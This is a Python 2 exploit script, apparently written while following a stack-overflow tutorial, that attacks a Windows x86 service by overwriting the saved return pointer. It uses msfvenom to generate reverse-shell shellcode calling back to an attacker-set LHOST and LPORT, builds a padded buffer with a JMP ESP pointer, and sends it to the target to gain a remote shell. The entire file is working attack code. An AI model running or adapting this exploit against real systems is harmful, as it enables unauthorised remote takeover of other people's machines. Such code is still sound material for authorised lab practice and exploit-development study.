#!/usr/bin/env python

# Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import struct, functions, subprocess

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()
ptr_jmp_esp = functions.getPtrJmpEsp()
LHOST = functions.getLhost()
LPORT = functions.getLport()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s; ptr_jmp_esp=%s" % (RHOST, RPORT, buf_totlen, offset_srp, hex(ptr_jmp_esp))

# instead of using NOPs, drag ESP up the stack to avoid GetPC issues
# note: when modifying ESP, always ensure that it remains divisible by 4
sub_esp_10 = "\x83\xec\x10"

LHOSTstr = "LHOST=" + LHOST
LPORTstr = "LPORT=" + str(LPORT)

# import shellcode from shellcode.py; or create shellcode if not exists
try:
    import shellcode
    print "shellcode.py already exists - using that shellcode..."
except:
    badchars = [struct.pack("B", x).encode("hex") for x in functions.getBadChars()]
    # print badchars
    for x in range(0, len(badchars)):
        badchars[x] = '\\x' + badchars[x]
        # print a[x]
    # print badchars

    badcharsstr = "'" + ''.join(badchars) + "'"
    print "badcharsstr =", badcharsstr

    cmd = ["msfvenom", "-p", "windows/shell_reverse_tcp", LHOSTstr, LPORTstr, "EXITFUNC=thread", "-v", "shellcode", "-b", badcharsstr, "-f", "python", "-o", "shellcode.py"]

    print ' '.join(cmd)

    try:
        subprocess.check_output(cmd)
        import shellcode

    except:
        print "Error generating shellcode :("
        exit()

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode.shellcode
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf.encode("hex")

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Caught reverse shell?"
